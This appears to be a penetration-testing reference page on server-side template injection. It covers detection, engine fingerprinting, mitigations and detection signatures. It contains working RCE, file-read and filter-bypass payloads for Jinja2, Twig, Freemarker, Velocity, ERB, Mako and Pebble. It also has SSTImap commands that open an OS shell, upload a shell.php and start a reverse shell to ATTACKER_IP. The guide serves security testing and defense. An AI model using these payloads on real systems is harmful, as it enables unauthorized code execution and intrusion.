% Filename: 04-web-testing/injection/ssti.md
% Display name: Server-Side Template Injection (SSTI)
% Last update: 2026-02-11
% ATT&CK Tactics: TA0001 (Initial Access), TA0002 (Execution)
% ATT&CK Techniques: T1190 (Exploit Public-Facing Application), T1059 (Command and Scripting Interpreter)
% Authors: @TristanInSec

# Server-Side Template Injection (SSTI)

## Overview

Server-Side Template Injection occurs when user input is embedded into a template engine's template string rather than passed as data. The attacker injects template directives that the engine evaluates server-side, leading to information disclosure, file read, or remote code execution.

Template engines (Jinja2, Twig, Freemarker, Velocity, ERB, Pebble, Mako, Smarty) are used to render dynamic HTML. When user input is concatenated directly into the template source — rather than passed as a variable to a safe template — injection becomes possible.

## ATT&CK Mapping

- **Tactic:** TA0002 - Execution
- **Technique:** T1059 - Command and Scripting Interpreter
- **Tactic:** TA0001 - Initial Access
- **Technique:** T1190 - Exploit Public-Facing Application

## Prerequisites

- Application uses a server-side template engine
- User input is inserted into the template source (not into a template variable)
- The template engine is not sandboxed, or the sandbox can be escaped

## Detection Methodology

### Identifying Injection Points

SSTI can exist wherever user input appears in rendered output — not just form fields. Check:

- URL parameters reflected in pages
- Form fields (name, email, comments)
- Profile fields, display names, custom templates
- Error messages that reflect input
- PDF/email/report generation from user data

### Confirming SSTI

Inject mathematical expressions using different template syntaxes. If the expression is evaluated (e.g., `49` appears instead of `7*7`), the template engine is processing input:

```text
{{7*7}}         → 49 (Jinja2, Twig, Pebble)
${7*7}          → 49 (Freemarker, Mako, Velocity, JSP EL, Thymeleaf)
<%= 7*7 %>      → 49 (ERB, EJS)
{"a"|cat:"b"}   → ab (Smarty — arithmetic is not evaluated directly in Smarty templates)
```

If `{{7*7}}` returns `49`, the next step is identifying which engine.

### Engine Fingerprinting

Use payloads that behave differently across engines to narrow down the technology:

```text
{{7*'7'}}
```

- **Jinja2** → `7777777` (string repetition)
- **Twig** → `49` (arithmetic)

```text
${7*7}
```

- **Freemarker** → `49`
- **Velocity** → `49`
- If it renders literally (`${7*7}`), the engine uses `{{ }}` syntax

Decision tree approach:
1. Try `{{7*7}}` — if evaluated → Jinja2, Twig, or Pebble family
2. Try `{{7*'7'}}` — `7777777` = Jinja2, `49` = Twig
3. Try `${7*7}` — if evaluated → Freemarker, Velocity, Mako, or JSP EL
4. Try `<%= 7*7 %>` — if evaluated → ERB or EJS

## Techniques

### Jinja2 (Python — Flask)

Jinja2 SSTI is the most commonly encountered in CTF and real-world Python applications.

**Information disclosure:**

```python
# Dump Flask configuration (Flask context only — not available in vanilla Jinja2)
{{config}}
{{config.items()}}

# Access application secret key (Flask)
{{config['SECRET_KEY']}}
```

**Class traversal to RCE:**

Python's object model allows traversing from any object to any class through `__mro__` (Method Resolution Order) and `__subclasses__()`:

```python
# Find the index of a useful class (e.g., subprocess.Popen or os._wrap_close)
{{''.__class__.__mro__[1].__subclasses__()}}
```

This returns a list of all loaded classes. Search the output for useful ones like `subprocess.Popen`, `os._wrap_close`, or `warnings.catch_warnings`.

```python
# RCE via os.popen (common payload)
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

# RCE via class traversal (index varies by Python version)
# First find the index of subprocess.Popen or os._wrap_close in __subclasses__()
{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()}}
```

**Bypassing restricted environments (when `_` is filtered):**

```python
# Access via request object (Flask)
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Using attr filter to bypass underscore filtering
{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')}}

# Hex encoding underscores (\x5f = _)
{{''|attr('\x5f\x5fclass\x5f\x5f')}}
```

### Twig (PHP — Symfony)

```php
# Version check (Twig 1.x only — _self.env was removed in Twig 2.x+)
{{_self.env.getVersion()}}

# RCE via callback registration (Twig 1.x only)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Twig 3.x significantly restricts accessible methods
# RCE typically requires finding application-specific objects in the template context
```

**Note:** Twig 3.x has hardened its sandbox. The `registerUndefinedFilterCallback` method no longer works. RCE in modern Twig typically requires finding application-specific objects in the template context rather than using generic payloads.

### Freemarker (Java — Spring)

```java
# Execute command
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

# File read
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve("/etc/passwd").toURL().openStream().readAllBytes()?join(" ")}
```

The `Execute` class is Freemarker's built-in command execution utility. If the `new()` built-in is available (not disabled in configuration), this is straightforward RCE.

### Velocity (Java)

Velocity RCE requires the template context to expose a usable object with class access methods. The `$class` variable is provided by Velocity Tools' `ClassTool` and is not available in all deployments. Verify what objects are in the template context before attempting exploitation.

```java
# Execute command via ScriptEngineManager (when $string or similar object is in context)
#set($s="")
#set($engine=$s.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js"))
#set($cmd=["id"])
#set($p=$s.getClass().forName("java.lang.Runtime").getMethod("exec",$cmd.getClass()).invoke($s.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),$cmd))
$p.text
```

### ERB (Ruby — Rails)

```ruby
# Execute command
<%= system("id") %>
<%= `id` %>

# File read
<%= File.read("/etc/passwd") %>

# Environment variables
<%= ENV.inspect %>
```

### Mako (Python)

```python
# Execute command
<%
import os
x = os.popen('id').read()
%>
${x}

# Shorter form
${__import__('os').popen('id').read()}
```

### Pebble (Java)

```java
# Variable listing
{{ beans }}

# RCE — (1).TYPE gives Integer.TYPE (int.class), then forName() traverses to an arbitrary class
# WARNING: methods[6] is the index of getRuntime() in java.lang.Runtime.getMethods()
# This index is JDK-version-specific and will vary across JDK releases.
# Enumerate the method list first: (1).TYPE.forName('java.lang.Runtime').methods
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}
```

## Automated Testing

### SSTImap

```bash
# SSTImap
# https://github.com/vladko312/SSTImap
# Install (not in Kali by default)
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap && pip3 install -r requirements.txt --break-system-packages

# Basic detection
python3 sstimap.py -u "http://target.com/page?name=test"

# Execute OS command
python3 sstimap.py -u "http://target.com/page?name=test" --os-cmd "id"

# Interactive OS shell
python3 sstimap.py -u "http://target.com/page?name=test" --os-shell

# Base language shell (evaluate expressions in the underlying language, e.g. Python)
python3 sstimap.py -u "http://target.com/page?name=test" --eval-shell

# Upload file to target
python3 sstimap.py -u "http://target.com/page?name=test" --upload local.txt /var/www/html/shell.php

# Reverse shell
python3 sstimap.py -u "http://target.com/page?name=test" --reverse-shell ATTACKER_IP 4444
```

### Manual Testing Workflow

When automated tools fail or are unavailable:

1. Submit `{{7*7}}` and `${7*7}` — check if either evaluates
2. Fingerprint the engine using differential payloads
3. Search for engine-specific RCE payloads from known research
4. Test payload in the target — adjust for filters and sandbox restrictions
5. Escalate from information disclosure to file read to RCE

## Detection Methods

### Network-Based Detection

- Template syntax characters in HTTP parameters (`{{`, `${`, `<%`, `#{`)
- Python dunder references in request data (`__class__`, `__mro__`, `__subclasses__`)
- Java class references (`java.lang.Runtime`, `freemarker.template.utility`)
- Ruby backticks or `system()` calls in parameters

### Host-Based Detection

- Template engine error messages in application logs (syntax errors from injection attempts)
- Unexpected child processes spawned by the web application
- Application process accessing files outside normal scope (`/etc/passwd`, `/etc/shadow`)
- Anomalous template compilation activity (frequent recompilation indicating injected templates)

## Mitigation Strategies

- **Never concatenate user input into template strings** — pass user data as template variables (`render_template('page.html', name=user_input)` is safe; `render_template_string('Hello ' + user_input)` is vulnerable)
- **Use logic-less template engines** — engines like Mustache/Handlebars are inherently safer because they don't support arbitrary code execution in templates
- **Sandbox the template engine** — Jinja2's `SandboxedEnvironment`, Freemarker's `Configuration.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER)`, Twig's sandbox extension
- **Input validation** — reject template metacharacters (`{`, `}`, `$`, `%`, `<`, `>`, `#`) when they are not expected
- **Run with least privilege** — limit the template engine process's OS permissions

## References

### Pentest Guides & Research

- [PortSwigger Web Security Academy - Server-Side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
- [OWASP - Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection)

### Tools

- [SSTImap](https://github.com/vladko312/SSTImap)

### MITRE ATT&CK

- [T1059 - Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
- [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
